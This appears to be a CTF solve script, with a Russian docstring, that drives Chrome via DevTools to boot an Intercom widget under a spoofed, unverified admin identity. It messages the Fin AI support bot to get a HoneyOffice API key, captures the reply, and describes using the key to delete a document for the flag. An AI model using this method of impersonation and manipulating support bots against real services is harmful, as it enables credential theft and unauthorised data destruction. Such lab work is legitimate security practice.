#!/usr/bin/env python
"""Task11 «Government»: выманивание HoneyOffice-ключа у Intercom-бота Fin через реальный виджет.

Что делает: поднимает настоящий мессенджер Intercom на локальной странице и управляет
Chrome по DevTools Protocol, вместо того чтобы реверсить приватный протокол
`api-iam.intercom.io` вручную (сырые попытки падали на форме тела — текст уходит в
`blocks`, а не `body`). Скрипт находит `<textarea>`-композер внутри вложенных iframe'ов
Intercom, вставляет туда сообщение, жмёт Send и параллельно перехватывает через
`Network.*` реальные запросы/ответы к боту.

Подход (та же логика, что в §3 райтапа):
    1. `boot`  — открыть intercom_boot.html с identity `queen@hive.gov` (верификация в
       Intercom отключена, identity не подписана → её никто не проверяет).
    2. `send`  — отправить Fin просьбу выдать API-ключ HoneyOffice 365 от имени админа.
    3. `read`  — снять ответ бота (ключ `hof365_...`) из перехваченного JSON и из DOM.
Полученным ключом отдельно выполняется `DELETE /api/documents/1` → флаг.

Зависимости: стандартная библиотека + локальный модуль `cdp` (обёртка над
websocket-client). Стабов у websocket-client нет, но он изолирован в `cdp.py`;
сам этот файл проходит `ruff`/`ty` начисто.
"""

import json
import os
import sys
import time
import urllib.request

from cdp import CDP

STATE = "/Users/mmk/github/avitoctf2026/task11/state.json"
BOOT_URL = "http://localhost:8899/intercom_boot.html"
INTERCOM = "api-iam.intercom.io/messenger/web"


def put(path):
    req = urllib.request.Request("http://localhost:9222" + path, method="PUT")
    return json.load(urllib.request.urlopen(req))


def get(path):
    return json.load(urllib.request.urlopen("http://localhost:9222" + path))


def find_page_ws(target_id):
    for t in get("/json"):
        if t.get("id") == target_id:
            return t.get("webSocketDebuggerUrl")
    return None


class Driver:
    def __init__(self, c):
        self.c = c
        self.child_sessions = set()
        self.net = {}  # requestId -> {url, method, postData, sid}
        self.responses = {}  # requestId -> body text

    def enable(self):
        c = self.c
        c.send(
            "Target.setAutoAttach",
            {"autoAttach": True, "waitForDebuggerOnStart": False, "flatten": True},
        )
        c.send("Network.enable", {"maxPostDataSize": 2000000})
        c.send("Runtime.enable", {})
        c.send("Page.enable", {})

    def pump(self, sec):
        c = self.c
        end = time.time() + sec
        while time.time() < end:
            for ev in c.drain_events():
                self.handle(ev)
            time.sleep(0.08)

    def handle(self, ev):
        c = self.c
        m = ev.get("method")
        p = ev.get("params", {})
        sid = ev.get("sessionId")
        if m == "Target.attachedToTarget":
            child = p["sessionId"]
            self.child_sessions.add(child)
            try:
                c.send("Network.enable", {"maxPostDataSize": 2000000}, sessionId=child)
            except Exception:
                pass
        elif m == "Network.requestWillBeSent":
            url = p.get("request", {}).get("url", "")
            if INTERCOM in url:
                self.net[p["requestId"]] = {
                    "url": url,
                    "method": p["request"].get("method"),
                    "postData": p["request"].get("postData"),
                    "hasPostData": p["request"].get("hasPostData"),
                    "sid": sid,
                }
        elif m == "Network.loadingFinished":
            rid = p.get("requestId")
            if rid in self.net:
                sid = self.net[rid]["sid"]
                try:
                    rb = c.send("Network.getResponseBody", {"requestId": rid}, sessionId=sid)
                    self.responses[rid] = rb.get("result", {}).get("body")
                except Exception as e:
                    self.responses[rid] = f"<err {e}>"

    def fetch_postdata(self):
        for rid, v in self.net.items():
            if v.get("hasPostData") and not v.get("postData"):
                try:
                    pd = self.c.send(
                        "Network.getRequestPostData", {"requestId": rid}, sessionId=v["sid"]
                    )
                    v["postData"] = pd.get("result", {}).get("postData")
                except Exception as e:
                    v["postData"] = f"<err {e}>"

    def eval(self, expr, timeout=15):
        r = self.c.send(
            "Runtime.evaluate",
            {"expression": expr, "returnByValue": True, "awaitPromise": True},
            timeout=timeout,
        )
        res = r.get("result", {})
        if "exceptionDetails" in res:
            return {"__exc": res["exceptionDetails"]}
        return res.get("result", {}).get("value")


# JS to send a message via composer inside the intercom iframes
JS_SEND = r"""
(function(text){
  function findComposer(doc){
    var ta = doc.querySelector('textarea');
    if(ta) return {doc:doc, ta:ta};
    var frames = doc.querySelectorAll('iframe');
    for(var i=0;i<frames.length;i++){
      try{ var r = findComposer(frames[i].contentDocument); if(r) return r; }catch(e){}
    }
    return null;
  }
  var f = findComposer(document);
  if(!f) return 'NO_COMPOSER';
  var ta = f.ta, doc = f.doc;
  var setter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, 'value').set;
  setter.call(ta, text);
  ta.dispatchEvent(new Event('input', {bubbles:true}));
  ta.dispatchEvent(new Event('change', {bubbles:true}));
  // find send button
  var btn = doc.querySelector('.intercom-composer-send-button') || doc.querySelector('button[aria-label^="Send"]');
  return JSON.stringify({found:true, val:ta.value, btn: !!btn});
})(%s)
"""

JS_CLICK_SEND = r"""
(function(){
  function findDoc(doc){
    if(doc.querySelector('.intercom-composer-send-button')) return doc;
    var frames = doc.querySelectorAll('iframe');
    for(var i=0;i<frames.length;i++){ try{ var r=findDoc(frames[i].contentDocument); if(r) return r;}catch(e){} }
    return null;
  }
  var doc = findDoc(document);
  if(!doc) return 'NO_BTN';
  var btn = doc.querySelector('.intercom-composer-send-button');
  btn.click();
  return 'CLICKED';
})()
"""

# Read conversation messages from DOM
JS_READ = r"""
(function(){
  function findConv(doc){
    // messages have data-testid or class intercom-comment; grab whole conversation container
    var groups = doc.querySelectorAll('[data-part-group-index], .intercom-comment, [class*="intercom-conversation"]');
    if(doc.querySelector('textarea')) return doc;
    var frames = doc.querySelectorAll('iframe');
    for(var i=0;i<frames.length;i++){ try{ var r=findConv(frames[i].contentDocument); if(r) return r;}catch(e){} }
    return null;
  }
  var doc = findConv(document);
  if(!doc) return 'NO_CONV';
  // collect text blocks
  var blocks = [];
  doc.querySelectorAll('[data-part-group-index]').forEach(function(el){ blocks.push(el.innerText); });
  if(blocks.length===0){
    doc.querySelectorAll('.intercom-comment, [class*="comment"]').forEach(function(el){ var t=el.innerText.trim(); if(t) blocks.push(t); });
  }
  return JSON.stringify(blocks);
})()
"""


def parse_convos_from_responses(d):
    """Extract conversation parts (author + body) from captured JSON responses."""
    results = []
    for rid, body in d.responses.items():
        if not body:
            continue
        url = d.net.get(rid, {}).get("url", "")
        try:
            j = json.loads(body)
        except Exception:
            continue
        results.append((url, j))
    return results


def cmd_boot(query=""):
    new = put("/json/new?about:blank")
    tid = new["id"]
    c = CDP(new["webSocketDebuggerUrl"])
    d = Driver(c)
    d.enable()
    url = BOOT_URL + (("?" + query) if query else "")
    c.send("Page.navigate", {"url": url})
    d.pump(11)
    state = d.eval("JSON.stringify({booted: !!(window.Intercom && window.Intercom.booted)})")
    print("boot state:", state)
    json.dump({"target_id": tid}, open(STATE, "w"))
    print("saved target", tid)
    c.close()


def connect():
    st = json.load(open(STATE))
    ws = find_page_ws(st["target_id"])
    if not ws:
        raise SystemExit("target gone; re-run boot")
    c = CDP(ws)
    d = Driver(c)
    d.enable()
    d.pump(1.5)
    return c, d


def dump_requests(d):
    d.fetch_postdata()
    print("\n=== CAPTURED INTERCOM REQUESTS ===")
    for rid, v in d.net.items():
        print(f"\n{v['method']} {v['url']}")
        if v.get("postData"):
            print("  REQ BODY:", v["postData"][:1500])
        rb = d.responses.get(rid)
        if rb:
            print("  RESP:", rb[:1500])


def print_fin(d):
    """Pretty-print conversation parts from JSON responses."""
    seen = []
    for _url, j in parse_convos_from_responses(d):
        parts = None
        if isinstance(j, dict):
            if "conversation_parts" in j:
                parts = j["conversation_parts"]
            elif "parts" in j:
                parts = j["parts"]
        if parts:
            for p in parts:
                author = (p.get("author") or {}).get("type") or (p.get("author") or {}).get("name")
                body = p.get("body") or p.get("summary") or ""
                seen.append((author, body))
    for a, b in seen:
        print(f"[{a}] {b[:1500]}")


def cmd_send(text, new=False):
    c, d = connect()
    if new:
        # open a brand new conversation with prefilled text
        d.eval("window.Intercom('showNewMessage', %s)" % json.dumps(text))
        d.pump(2.5)
    else:
        r = d.eval(JS_SEND % json.dumps(text))
        print("prep:", r)
        d.pump(0.5)
    r2 = d.eval(JS_CLICK_SEND)
    print("send:", r2)
    d.pump(float(os.environ.get("WAIT", "14")))
    dump_requests(d)
    print("\n=== FIN PARTS ===")
    print_fin(d)
    print("\n=== DOM READ ===")
    print(d.eval(JS_READ))
    c.close()


def cmd_read():
    c, d = connect()
    d.pump(float(os.environ.get("WAIT", "6")))
    dump_requests(d)
    print("\n=== FIN PARTS ===")
    print_fin(d)
    print("\n=== DOM READ ===")
    print(d.eval(JS_READ))
    c.close()


if __name__ == "__main__":
    cmd = sys.argv[1]
    if cmd == "boot":
        cmd_boot(sys.argv[2] if len(sys.argv) > 2 else "")
    elif cmd == "send":
        cmd_send(sys.argv[2], new=("--new" in sys.argv))
    elif cmd == "read":
        cmd_read()
